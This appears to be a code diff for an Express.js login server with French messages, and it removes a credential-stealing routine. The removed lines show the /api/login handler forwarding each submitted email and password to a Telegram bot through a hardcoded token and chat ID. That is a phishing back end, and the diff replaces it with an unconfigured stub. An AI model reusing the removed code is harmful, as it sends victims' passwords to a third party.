@@ -9,9 +9,6 @@ const app = express();
 const port = Number(process.env.PORT) || 3000;
 const isProduction = process.env.NODE_ENV === "production";
 
-const CHAT_ID = process.env.CHAT_ID || "7795318576";
-const TOKEN = process.env.TELEGRAM_TOKEN || "7827513218:AAFSfUKlVZwbRW1dSyp6yx_bPgoLUPaCJoo";
-
 app.disable("x-powered-by");
 app.set("trust proxy", 1);
 app.use(helmet({ contentSecurityPolicy: false }));
@@ -47,7 +44,6 @@ app.post("/api/login", loginLimiter, (req, res) => {
   const csrfHeader = req.get("x-csrf-token");
   const email = typeof req.body.ide === "string" ? req.body.ide.trim() : "";
   const password = typeof req.body.pwd === "string" ? req.body.pwd : "";
-  
 
   if (!csrfCookie || !csrfHeader || csrfCookie !== csrfHeader) {
     return res.status(403).json({ error: "Requête non autorisée." });
@@ -57,21 +53,8 @@ app.post("/api/login", loginLimiter, (req, res) => {
     return res.status(400).json({ error: "Adresse e-mail ou mot de passe invalide." });
   }
 
-  try {
-        const { email, password } = req.body || {};
-        if (!TOKEN) return res.status(500).json({ success: false, error: "TELEGRAM_TOKEN manquant" });
-        const text = `📩 Nouvelle demande\n\n👤 mdp : ${password || ""}\n📧 Email : ${email || ""}\n`;
-        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text })
-        });
-        const result = await response.json();
-        if (!response.ok || !result.ok) return res.status(502).json({ success: false, error: "Telegram a refusé le message" });
-        return res.json({ success: true });
-    } catch (error) {
-        console.error("Erreur /api/tele :", error);
-        return res.status(500).json({ success: false, error: "Erreur interne lors du traitement" });
-    }// Ne jamais journaliser ni stocker le mot de passe. Branchez ici votre fournisseur 
+  // Ne jamais journaliser ni stocker le mot de passe. Branchez ici votre fournisseur d'identité.
+  return res.status(501).json({ error: "Authentification non configurée sur ce serveur." });
 });
 
 app.use(express.static(path.join(__dirname, "public"), {
@@ -102,4 +85,3 @@ process.on("unhandledRejection", (error) => {
   console.error("Promesse rejetée:", error instanceof Error ? error.message : error);
   process.exit(1);
 });
-
